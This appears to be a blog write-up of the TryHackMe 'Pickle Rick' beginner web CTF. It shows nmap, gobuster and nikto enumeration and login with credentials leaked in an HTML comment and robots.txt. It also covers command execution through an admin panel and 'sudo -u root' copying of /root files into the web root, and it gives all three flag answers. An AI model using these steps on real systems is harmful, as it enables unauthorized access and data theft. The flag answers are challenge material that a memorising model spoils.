---
author: Chance Johnson
description: Beginner level web server CTF by tryhackme on TryHackMe.
layout: post
title: Pickle Rick
---
[Pickle Rick](https://tryhackme.com/room/picklerick) is a beginner level web app CTF on TryHackMe by tryhackme. For this challenge, I will use Kali Linux.

# 1. What is the first ingredient Rick needs?
The description of this challenge says to exploit a web server. First I opened up Firefox and entered the given IP:
![[Screenshot from 2023-03-31 17-43-44.png]]

The text at the bottom says we must log on to Rick's computer and find three ingredients to complete the pickle-reverse potion. The problem is that Rick forget his password.

Upon inspecting the HTML of the website, I found the following comment in the `<body>` tag:
```
<!--
	Note to self, remember username!
	Username: R1ckRul3s
-->
```

Now I've got a username, `R1ckRul3s`, but where can I use it? I'll do some more enumeration:
```
sudo nmap 10.10.225.43
```

Output:
```
22/tcp open  ssh
80/tcp open  http
```

There appears to be an SSH server listening on `22/tcp`.  When I attempt to login to the server with the "R1ckRul3s" username, I get a "permission denied (publickey)" message. 

I'll look for some more resources:
```
gobuster dir -u http://10.10.225.43/ -w /usr/share/wordlists/dirb/common.txt
```

The following resources were discovered:
```
/.hta
/.htpasswd
/.htaccess
/assets
/index.html
/robots.txt
/server-status
```

The `/server-status` page gave me an HTTP 403 Forbidden error. On the `/robots.txt` page was the text: `Wubbalubbadubdub`. 

I'm going to do some more enumeration with Nikto:
```
nikto -host http://10.10.225.43
```

Output:
```
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /login.php: Admin login page/section found.
```

Looks like this is an Apache server running on an Ubuntu host. The scan also found a`/login.php` page:
![[Screenshot from 2023-03-31 17-55-40 1.png]]

I already know the username is `R1ckRul3s`, but what is the password? I'll try that text that was in the `/robots.txt` file: `Wubbalubbadubdub`.

Looks like it was successful. I am logged into what appears to be some kind of admin panel at `/portal.php`:
![[Screenshot from 2023-03-31 18-00-47.png]]

I already know this website is being hosted on an Ubuntu host, so I'm assuming this is an interface for running Bash commands. I typed in `ls` into the input field, and the following was printed to page:
```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

I appear to be in the root directory of the web server. It looks like one of the ingredients can be found in `Sup3rS3cretPickl3Ingred.txt`. I attempted to view the contents of this file with the command `cat Sup3rS3cretPickl3Ingred.txt`, but I was greeted with the following page:
![[Screenshot from 2023-03-31 18-09-36.png]]

I navigated to `http://10.10.225.43/Sup3rS3cretPickl3Ingred.txt` which displayed the text `mr. meeseek hair`.

**Answer**: mr. meeseek hair

# 2. Whats the second ingredient Rick needs?
There's another file in the web server root called `clue.txt`. I navigated to `http://10.10.225.43/clue.txt` and found the text `Look around the file system for the other ingredient.`.

I found another user `rick` in the `/home` directory, so I executed `ls /home/rick`, and found another regular file named `second ingredients`. Now how do I open this file? First, I attempt to copy the file to the web server root directory:

```
cp "/home/rick/second ingredients" .
```

However this didn't seem to work, so I must not have sufficient permissions. After some messing around, I discovered I can execute commands as the root user:
```
sudo -u root whoami
```

Output: `root`. I'll attempt to copy the file again:
```
sudo -u root cp "/home/rick/second ingredients" .
```

This time it appears to have worked, so I'll navigate to `http://10.10.225.43/second ingredients` where I find the text `1 jerry tear`.

**Answer**: 1 jerry tear

# 3. Whats the final ingredient Rick needs?
After some digging around, I found a text file called `3rd.txt` in the `/root` directory. I copied that to the Apache web server's root directory:
```
sudo -u root cp /root/3rd.txt .
```

And navigated to `http://10.10.225.43/3rd.txt`, where I found the text `3rd ingredients: fleeb juice`.

**Answer**: fleeb juice

